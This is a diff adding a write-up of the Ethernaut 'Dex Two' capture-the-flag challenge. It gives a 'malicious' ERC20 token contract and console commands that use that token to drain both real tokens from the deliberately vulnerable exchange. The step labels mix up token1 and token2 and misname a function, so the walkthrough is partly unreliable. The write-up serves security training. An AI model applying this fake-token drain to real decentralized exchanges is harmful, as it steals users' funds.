@@ -820,3 +820,46 @@ Player’s balance (swap 10 token1 to token2) :
 In the last swapping, we’ll have 65 token2. We cannot swap `65 token2` to `158** token1` since `token1` is not enough as of the current price. The contract currently has `110 token1` and `45 token2`. `(65 * 110 )/45 = 158`
 If we need to drain all 110 token1, the amount of token2 to be swapped is: `(65 * 110) / 158 = 45`
 
+
+
+# 23. [Challenge 23: Dex Two](https://ethernaut.openzeppelin.com/level/0xd2BA82c4777a8d619144d32a2314ee620BC9E09c)
+
+Tasks:
+- You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.
+
+**Solution:** \
+Attack Payload:
+```
+pragma solidity ^0.6.0;
+
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.1.0/contracts/token/ERC20/ERC20.sol";
+
+contract MaliciousToken is ERC20 {
+    constructor () public ERC20("Malicious", "MAL") {
+        _mint(msg.sender, 1000000 * (10 ** uint256(decimals())));
+    }
+}
+```
+1. Create MAL token by using Openzeppelin’s ERC20 and mint 1M of MAL to our address via _mint()
+2. Approve the Dex contract: `Dex_address, 1000000`
+3. Add MAL token to the Dex contract via `add_liquidity()`
+```
+let MAL = "0x17E82E862fA262F80332Bb527C34BcC2755C9318";
+await contract.add_liquidity(MAL, 100)
+```
+4. Now, we can use 100 MAL to swap 100 token2 indicating from `get_swap_price()`
+```
+(await contract.get_swap_amount(MAL, await contract.token1(), 100)).toString()
+```
+5. Swap 100 MAL for 100 token2 using swap(). We successfully solve the 1st requirement for the challenge since the current balance of token1 in the Dex contract is 0
+```
+await contract.swap(MAL, await contract.token1(), 100);
+Check Balance: (await contract.balanceOf(await contract.token1(), instance)).toString()
+```
+6. Now to swap 200 MAL for 100 token1 using swap(). We successfully solve the challenge since the current balance of token1 and token2 in the Dex contract is 0
+```
+await contract.swap(MAL, await contract.token2(), 200);
+Check Balance: (await contract.balanceOf(await contract.token2(), instance)).toString()
+```
+
+
